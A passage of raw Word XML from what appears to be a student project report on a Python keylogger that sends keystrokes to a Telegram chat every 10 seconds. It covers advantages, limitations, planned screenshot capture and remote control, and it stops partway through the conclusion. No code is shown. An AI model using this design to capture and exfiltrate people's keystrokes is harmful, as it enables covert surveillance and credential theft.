    <w:p w14:paraId="4DF7B5AA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>5.3 Advantages of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5684"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="4799C78B" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="330126BB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Feature</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E37A3F5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="2A25A216" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7188FBA8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Real-time Delivery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F2B45E8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Logs delivered instantly to Telegram, unlike delayed emails.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="26685BED" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00C7E071" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Simpler Setup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EF9F63E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Only bot token and chat ID needed (no SMTP config).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="0E03359E" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C9B694E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Cross-Platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41239B22" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Works on Windows and Linux.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="2823972D" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C2CAA7E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Lightweight</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4895712D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Low CPU and memory footprint.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="75BE5FC4" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="786B6C4A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Secure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C265602" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Bot is isolated from your personal Telegram account.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="236CE8A0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="54C4B7D4">
          <v:rect id="_x0000_i1479" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="242516DF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>5.4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5419"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="490F71A3" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3DEB2D32" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Limitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0231BC3F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="076DE13D" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70874F42" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Requires Internet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11F88E0A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Without internet access, logs cannot be sent to Telegram.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="7880EA6F" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D669F34" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Single Chat ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04F650A8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Current code sends to one chat only.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="349AFD96" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04AEA761" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Only Keystrokes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B57DBE0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Does not capture screenshots or clipboard content.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="546E2FCC" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38FF3BD5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Manual Exit Keyword</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32A73A23" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve">User must type </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>exitlog</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> to stop.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="222C9235" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="19CD2B3E">
          <v:rect id="_x0000_i1480" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F1C0B7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>5.5 Future Enhancements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7AEE92" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Multi-Chat Support:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Allow sending logs to multiple chat IDs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1F1276" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Encrypted Local Backup:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Store logs locally in encrypted form before sending.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3513EDEB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Screenshot Capture:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Extend functionality to send screenshots periodically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589B1AEC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Configurable Interval:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Let the user change time intervals via a config file or bot command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5164C5AC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Remote Start/Stop:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Allow the Telegram bot to receive commands to start or stop logging remotely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727735DB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 6 – Conclusion and References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6259FC48" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>6.1 Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31303B63" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">This project successfully implemented a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Python-based keylogger with Telegram reporting</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, replacing the traditional email-based approach. Using Python’s </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> for capturing keystrokes and the requests library to communicate with the </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Bot API</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, the system demonstrated how logs can be transmitted </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>instantly and securely</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to a Telegram chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226307A7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Key achievements:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C295E78" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Captured keystrokes in real time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1A0266" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Aggregated them in a buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DAF6F9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Sent them to a Telegram bot chat periodically (every 10 seconds).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254161DC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
